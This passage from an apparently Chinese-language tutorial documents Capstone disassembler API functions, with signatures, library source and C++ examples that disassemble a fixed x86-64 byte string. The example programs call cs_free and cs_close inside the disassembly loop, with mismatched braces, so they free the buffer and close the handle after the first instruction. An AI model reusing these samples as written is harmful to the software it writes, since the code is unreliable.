class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c100276bac46235.jpg" alt></p><h3 id="cs-insn-name"><a href="#cs-insn-name" class="headerlink" title="cs_insn_name"></a>cs_insn_name</h3><p><code>const char * CAPSTONE_API cs_insn_name(csh handle, unsigned int insn_id);</code></p><p>获取指令的名字(string类型)<br>指令id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>insn_id: 指令id<br>return: 指令的字符名, 如果insn_id不可用返回NULL</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c18c11f4cc51220.jpg" alt></p><p>示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s"</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"            instruction:  %s"</span>, cs_insn_name(handle, insn-&gt;id));   <span class="comment">//输出该行的操作指令</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c250a6507076991.jpg" alt></p><h3 id="cs-group-name"><a href="#cs-group-name" class="headerlink" title="cs_group_name"></a>cs_group_name</h3><p><code>const char * CAPSTONE_API cs_group_name(csh handle, unsigned int group_id);</code></p><p>输出指令类型名字<br>指令id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>insn_id: 指令类型id<br>return: 指令类型的字符名, 如果insn_id不可用返回NULL</p><p>实现代码及示例都与上面类似，略。。</p><h3 id="cs-insn-group"><a href="#cs-insn-group" class="headerlink" title="cs_insn_group"></a>cs_insn_group</h3><p><code>bool CAPSTONE_API cs_insn_group(csh handle, const cs_insn *insn, unsigned int group_id);</code></p><p>检查反汇编后的指令是否属于某个特定指令类型。</p><p>注意：只有当detail选项为ON时这个API可用 (默认OFF).<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;groups数组。</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>group_id: 要检查此指令是否属于的指令类型。<br>return: 如果该指令确实属于给定的指令类型，则为true，否则为false。</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c28779993339180.png" alt></p><p>示例(判断是否属于跳转指令)：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"is JUMP:   "</span> &lt;&lt;cs_insn_group(handle, insn, CS_GRP_JUMP) &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//判断是否为跳转指令</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c2cad6a6ee36943.jpg" alt></p><h3 id="cs-reg-read"><a href="#cs-reg-read" class="headerlink" title="cs_reg_read"></a>cs_reg_read</h3><p><code>bool CAPSTONE_API cs_reg_read(csh handle, const cs_insn *insn, unsigned int reg_id);</code></p><p>检查反汇编指令是否隐式使用特定寄存器。</p><p>注意:此API仅在启用detail选项时有效(默认为关闭)<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;regs_read数组。</p><p>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>reg_id: 标注想要检查的这个指令是否使用了它。<br>return: 如果该指令确实隐式使用了给定寄存器，则为true，否则为false。</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c2ec62282774188.jpg" alt></p><p>示例同API cs_disasm_iter</p><h3 id="cs-reg-write"><a href="#cs-reg-write" class="headerlink" title="cs_reg_write"></a>cs_reg_write</h3><p><code>bool CAPSTONE_API cs_reg_write(csh handle, const cs_insn *insn, unsigned int reg_id);</code></p><p>检查反汇编指令是否隐式修改了特定寄存器。</p><p>注意:此API仅在启用detail选项时有效(默认为关闭)<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;regs_read数组。</p><p>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>reg_id: 标注想要检查的这个指令是否修改了它。<br>return: 如果该指令确实隐式修改了给定寄存器，则为true，否则为false。</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c2f67ee69f50813.jpg" alt></p><p>示例同API cs_disasm_iter</p><h3 id="cs-op-count"><a href="#cs-op-count" class="headerlink" title="cs_op_count"></a>cs_op_count</h3><p><code>int CAPSTONE_API cs_op_count(csh handle, const cs_insn *insn, unsigned int op_type);</code></p><p>计算给定类型的操作数的数量。<br>注意：只有当detail选项为ON时这个API可用 (默认OFF).</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>op_type: 要找到的操作数类型。<br>return: 指令insn中给定类型op_type的操作数的数量，返回-1表示查找失败。</p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_op_count</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn, <span class="keyword">unsigned</span> <span class="keyword">int</span> op_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> count = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (handle-&gt;arch) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">handle-&gt;errnum = CS_ERR_HANDLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm.operands[i].type == (arm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM64:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm64.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm64.operands[i].type == (arm64_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_X86:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;x86.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;x86.operands[i].type == (x86_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_MIPS:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;mips.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;mips.operands[i].type == (mips_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_PPC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;ppc.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;ppc.operands[i].type == (ppc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SPARC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sparc.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sparc.operands[i].type == (sparc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SYSZ:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sysz.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sysz.operands[i].type == (sysz_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_XCORE:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;xcore.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;xcore.operands[i].type == (xcore_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M68K:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m68k.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m68k.operands[i].type == (m68k_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_TMS320C64X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;tms320c64x.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;tms320c64x.operands[i].type == (tms320c64x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M680X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m680x.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m680x.operands[i].type == (m680x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_EVM:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;evm.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;evm.operands[i].type == (evm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿x86指令操作码类型举例<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> x86_op_type &#123;</span><br><span class="line">X86_OP_INVALID = <span class="number">0</span>, <span class="comment">///&lt; = CS_OP_INVALID (未初始化).</span></span><br><span class="line">X86_OP_REG, <span class="comment">///&lt; = CS_OP_REG (寄存操作码).</span></span><br><span class="line">X86_OP_IMM, <span class="comment">///&lt; = CS_OP_IMM (立即操作码).</span></span><br><span class="line">X86_OP_MEM, <span class="comment">///&lt; = CS_OP_MEM (内存操作码).</span></span><br><span class="line">&#125; x86_op_type;</span><br></pre></td></tr></table></figure></p><p>示例(判断寄存操作码)：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"is REG:   "</span> &lt;&lt; cs_op_count(handle, insn, X86_OP_REG) &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//判断是否为寄存操作码</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span 